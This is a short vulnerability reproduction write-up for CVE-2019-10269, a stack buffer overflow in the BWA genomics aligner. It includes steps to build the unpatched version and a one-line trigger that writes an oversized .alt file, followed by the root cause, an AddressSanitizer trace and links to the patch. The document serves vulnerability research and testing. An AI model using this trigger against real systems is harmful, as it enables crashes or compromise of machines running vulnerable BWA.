# CVE-2019-10269 

## Experiment Environment

Ubuntu 20.04 LTS

## INSTALL & Configuration

```
git clone https://github.com/lh3/bwa.git
cd bwa
git fetch origin pull/232/head:alt-bufferoverflow-patch
git checkout alt-bufferoverflow-patch
git checkout HEAD^
make
```

## Problems in Installation & Configuration

## PoCs

[Taking local control of genomics machines through BWA](https://coreymhudson.github.io/bwa_vulnerabilties/)

## How to trigger vulnerability

```
# In directory CVE-2019-10269
./bwa/bwa index sample.fa
python3 -c "print('A' * 5200)" > sample.fa.alt
./bwa/bwa mem sample.fa whatever
```

## Vulnerability Details & Patch

### Root Cause

```
bntseq.c:180
	char str[1024];

bntseq.c:190
	while ((c = fgetc(fp)) != EOF) {
```

### Stack Trace

```
==276574==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffeb401dc20 at pc 0x5624c486c988 bp 0x7ffeb401c530 sp 0x7ffeb401c520
WRITE of size 1 at 0x7ffeb401dc20 thread T0
    #0 0x5624c486c987 in bns_restore /home/sophie/source_code/LinuxFlaw/CVE-2019-10269/bwa/bntseq.c:200
    #1 0x5624c4872c61 in bwa_idx_load_from_disk /home/sophie/source_code/LinuxFlaw/CVE-2019-10269/bwa/bwa.c:275
    #2 0x5624c485295c in main_mem /home/sophie/source_code/LinuxFlaw/CVE-2019-10269/bwa/fastmap.c:330
    #3 0x5624c48084d8 in main /home/sophie/source_code/LinuxFlaw/CVE-2019-10269/bwa/main.c:85
    #4 0x7f3d42b040b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)
    #5 0x5624c4808abd in _start (/home/sophie/source_code/LinuxFlaw/CVE-2019-10269/bwa/bwa+0x17abd)
```

### Patch

[Buffer overflow while storing .alt file using bwa mem](https://github.com/lh3/bwa/pull/232)

## References

[USN-4087-1: BWA vulnerability](https://ubuntu.com/security/notices/USN-4087-1)
